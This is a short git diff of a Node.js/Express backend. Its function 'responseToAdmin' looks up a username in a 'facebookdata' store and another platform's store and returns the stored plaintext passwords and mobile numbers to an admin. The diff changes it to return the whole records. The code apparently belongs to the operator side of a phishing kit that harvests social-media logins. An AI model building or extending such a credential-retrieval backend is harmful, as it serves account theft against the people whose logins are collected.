@@ -94,11 +94,12 @@ function responseToAdmin(plateform, username, res) {
             // console.log(resp)
             if (resp[0]) {
                 res.status(200)
-                res.json({
-                    username: resp[0]['username'],
-                    password: resp[0]['password'],
-                    mobiles: resp[0]['mobile']
-                })
+                 res.json(resp)
+                    // res.json({
+                    //     username: resp[0]['username'],
+                    //     password: resp[0]['password'],
+                    //     mobiles: resp[0]['mobile']
+                    // })
             } else {
                 res.status(404).send('user not found')
             }
@@ -108,11 +109,12 @@ function responseToAdmin(plateform, username, res) {
         facebookdata.find({ username: { "$in": [username] } }, { _id: 0, username: 1, password: 1, mobile: 1 }, (err, resp) => {
             if (resp[0]) {
                 res.status(200)
-                res.json({
-                    username: resp[0]['username'],
-                    password: resp[0]['password'],
-                    mobiles: resp[0]['mobile']
-                })
+                 res.json(resp)
+                    // res.json({
+                    //     username: resp[0]['username'],
+                    //     password: resp[0]['password'],
+                    //     mobiles: resp[0]['mobile']
+                    // })
             } else {
                 res.status(404).send('user not found')
             }
